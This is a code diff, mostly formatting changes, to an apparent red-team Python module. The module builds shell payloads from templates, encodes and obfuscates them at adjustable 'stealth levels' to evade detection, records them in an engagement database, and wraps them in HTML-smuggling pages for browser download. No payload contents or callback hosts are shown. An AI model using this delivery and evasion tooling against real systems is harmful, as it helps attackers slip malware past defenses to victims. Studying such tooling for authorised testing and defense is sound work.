@@ -21,6 +21,7 @@ OPSEC:
     payloads table.
   - Payload files are registered with cleanup.py at the moment of disk write.
 """
+
 from __future__ import annotations
 
 import base64
@@ -50,16 +51,25 @@ _VALID_STEPS = frozenset({"base64", "hex", "xor", "gzip_b64", "char_insert", "ut
 
 # CyberChef operation map (decode direction)
 _CYBERCHEF_OP_MAP: dict[str, list[dict]] = {
-    "base64":     [{"op": "From Base64", "args": {"alphabet": "A-Za-z0-9+/=", "remove_non_alphabet_chars": True}}],
-    "hex":        [{"op": "From Hex",    "args": {"delimiter": "Auto"}}],
-    "xor":        [{"op": "XOR",         "args": {"key": "<see payload header byte 0>", "scheme": "Standard"}}],
-    "gzip_b64":   [{"op": "From Base64", "args": {}}, {"op": "Gunzip", "args": {}}],
-    "utf16le_b64":[{"op": "From Base64", "args": {}}, {"op": "Decode text", "args": ["UTF-16LE (1200)"]}],
-    "char_insert":[],  # no decode op — inert characters stripped by shell
+    "base64": [
+        {
+            "op": "From Base64",
+            "args": {"alphabet": "A-Za-z0-9+/=", "remove_non_alphabet_chars": True},
+        }
+    ],
+    "hex": [{"op": "From Hex", "args": {"delimiter": "Auto"}}],
+    "xor": [{"op": "XOR", "args": {"key": "<see payload header byte 0>", "scheme": "Standard"}}],
+    "gzip_b64": [{"op": "From Base64", "args": {}}, {"op": "Gunzip", "args": {}}],
+    "utf16le_b64": [
+        {"op": "From Base64", "args": {}},
+        {"op": "Decode text", "args": ["UTF-16LE (1200)"]},
+    ],
+    "char_insert": [],  # no decode op — inert characters stripped by shell
 }
 
 
 # ── EncodingChain ──────────────────────────────────────────────────────────────
+
 
 class EncodingChain:
     """
@@ -72,7 +82,7 @@ class EncodingChain:
     """
 
     def __init__(self) -> None:
-        self._steps:   list[str] = []
+        self._steps: list[str] = []
         self._xor_key: int | None = None
 
     def add(self, step: str, xor_key: int | None = None) -> EncodingChain:
@@ -148,23 +158,25 @@ class EncodingChain:
 
 # ── Payload record (lightweight value object) ──────────────────────────────────
 
+
 @dataclass
 class RenderedPayload:
-    shell_type:       str
-    target_os:        str
-    raw:              str             # Plaintext rendered output
-    encoded:          str             # After EncodingChain
-    obfuscated:       str | None   # After ObfuscationEngine (may equal encoded)
-    sha256_raw:       str
-    sha256_encoded:   str
-    encoding_chain:   list[str]
+    shell_type: str
+    target_os: str
+    raw: str  # Plaintext rendered output
+    encoded: str  # After EncodingChain
+    obfuscated: str | None  # After ObfuscationEngine (may equal encoded)
+    sha256_raw: str
+    sha256_encoded: str
+    encoding_chain: list[str]
     cyberchef_recipe: list[dict]
-    stealth_level:    int             # 1–5; 5 = maximum obfuscation
-    template_name:    str
-    xor_key:          int | None = None
+    stealth_level: int  # 1–5; 5 = maximum obfuscation
+    template_name: str
+    xor_key: int | None = None
 
 
 # ── PayloadBuilder ─────────────────────────────────────────────────────────────
+
 
 class PayloadBuilder:
     """
@@ -186,30 +198,30 @@ class PayloadBuilder:
 
     def __init__(
         self,
-        template_dir:  Path = _DEFAULT_TMPL_DIR,
-        obfuscate:     bool = True,
-        stealth_level: int  = 3,
+        template_dir: Path = _DEFAULT_TMPL_DIR,
+        obfuscate: bool = True,
+        stealth_level: int = 3,
     ) -> None:
         if not 1 <= stealth_level <= 5:
             raise ValueError(f"stealth_level must be 1–5, got {stealth_level}")
 
         self._env = Environment(
-            loader    = FileSystemLoader(str(template_dir)),
-            undefined = StrictUndefined,
-            autoescape= False,
+            loader=FileSystemLoader(str(template_dir)),
+            undefined=StrictUndefined,
+            autoescape=False,
         )
-        self._obfuscator   = ObfuscationEngine()
-        self._obfuscate    = obfuscate
-        self._stealth_level= stealth_level
+        self._obfuscator = ObfuscationEngine()
+        self._obfuscate = obfuscate
+        self._stealth_level = stealth_level
 
     # ── Public API ─────────────────────────────────────────────────────────────
 
     def build(
         self,
         template_name: str,
-        context:       dict[str, Any],
-        chain:         EncodingChain | None = None,
-        lport:         int | None = None,
+        context: dict[str, Any],
+        chain: EncodingChain | None = None,
+        lport: int | None = None,
     ) -> RenderedPayload:
         """
         Render a template, encode, obfuscate, and return a RenderedPayload.
@@ -227,7 +239,7 @@ class PayloadBuilder:
 
         # 1. Render template
         tmpl = self._env.get_template(template_name)
-        raw  = tmpl.render(**context).strip()
+        raw = tmpl.render(**context).strip()
 
         # 2. Encode
         encoded = chain.apply(raw)
@@ -235,38 +247,39 @@ class PayloadBuilder:
         # 3. Obfuscate (optional)
         obfuscated: str | None = None
         if self._obfuscate:
-            target   = self._infer_target(template_name)
+            target = self._infer_target(template_name)
             criteria = self._STEALTH_CRITERIA[self._stealth_level]
-            result   = self._obfuscator.obfuscate(
-                raw      = raw,
-                target   = target,
-                criteria = criteria,
-                xor_key  = chain.xor_key,
-                lport    = lport,
+            result = self._obfuscator.obfuscate(
+                raw=raw,
+                target=target,
+                criteria=criteria,
+                xor_key=chain.xor_key,
+                lport=lport,
             )
             if result.violations:
                 _LOG.warning(
                     "Evasion invariant violations in %s: %s",
-                    template_name, result.violations,
+                    template_name,
+                    result.violations,
                 )
             obfuscated = result.text
 
-        sha256_raw     = hashlib.sha256(raw.encode()).hexdigest()
+        sha256_raw = hashlib.sha256(raw.encode()).hexdigest()
         sha256_encoded = hashlib.sha256(encoded.encode()).hexdigest()
 
         return RenderedPayload(
-            shell_type       = self._infer_target(template_name),
-            target_os        = self._infer_os(template_name),
-            raw              = raw,
-            encoded          = encoded,
-            obfuscated       = obfuscated,
-            sha256_raw       = sha256_raw,
-            sha256_encoded   = sha256_encoded,
-            encoding_chain   = chain.steps,
-            cyberchef_recipe = chain.to_cyberchef_recipe(),
-            stealth_level    = self._stealth_level,
-            template_name    = template_name,
-            xor_key          = chain.xor_key,
+            shell_type=self._infer_target(template_name),
+            target_os=self._infer_os(template_name),
+            raw=raw,
+            encoded=encoded,
+            obfuscated=obfuscated,
+            sha256_raw=sha256_raw,
+            sha256_encoded=sha256_encoded,
+            encoding_chain=chain.steps,
+            cyberchef_recipe=chain.to_cyberchef_recipe(),
+            stealth_level=self._stealth_level,
+            template_name=template_name,
+            xor_key=chain.xor_key,
         )
 
     def emit_recipe_file(self, payload: RenderedPayload, output_path: Path) -> None:
@@ -284,7 +297,7 @@ class PayloadBuilder:
 
     def write_payload(
         self,
-        payload:     RenderedPayload,
+        payload: RenderedPayload,
         output_path: Path,
         use_encoded: bool = True,
     ) -> str:
@@ -305,16 +318,18 @@ class PayloadBuilder:
         sha256 = hashlib.sha256(content.encode()).hexdigest()
         _LOG.info(
             "Payload written: %s (sha256=%s stealth=%d)",
-            output_path, sha256[:16], payload.stealth_level,
+            output_path,
+            sha256[:16],
+            payload.stealth_level,
         )
         return sha256
 
     def persist_record(
         self,
-        db_path:      Path,
+        db_path: Path,
         engagement_id: int,
-        payload:      RenderedPayload,
-        staged_url:   str | None = None,
+        payload: RenderedPayload,
+        staged_url: str | None = None,
     ) -> int:
         """
         Write payload metadata to engagement DB payloads table.
@@ -375,6 +390,7 @@ class PayloadBuilder:
 
 # ── Standalone HTML smuggling builder ─────────────────────────────────────────
 
+
 class HTMLSmuggler:
     """
     Generates an HTML page that smuggles a payload via the browser's download API.
@@ -422,9 +438,9 @@ class HTMLSmuggler:
     def build(
         self,
         payload_bytes: bytes,
-        filename:      str,
-        title:         str  = "Document",
-        mime_type:     str  = "application/octet-stream",
+        filename: str,
+        title: str = "Document",
+        mime_type: str = "application/octet-stream",
     ) -> str:
         """
         Return an HTML string that smuggles `payload_bytes` as a download named `filename`.
@@ -437,10 +453,10 @@ class HTMLSmuggler:
         """
         b64 = base64.b64encode(payload_bytes).decode()
         return self._TEMPLATE.format(
-            b64_payload = b64,
-            filename    = filename,
-            title       = title,
-            mime_type   = mime_type,
+            b64_payload=b64,
+            filename=filename,
+            title=title,
+            mime_type=mime_type,
         )
 
     def write(self, payload_bytes: bytes, filename: str, output_path: Path, **kwargs) -> str:
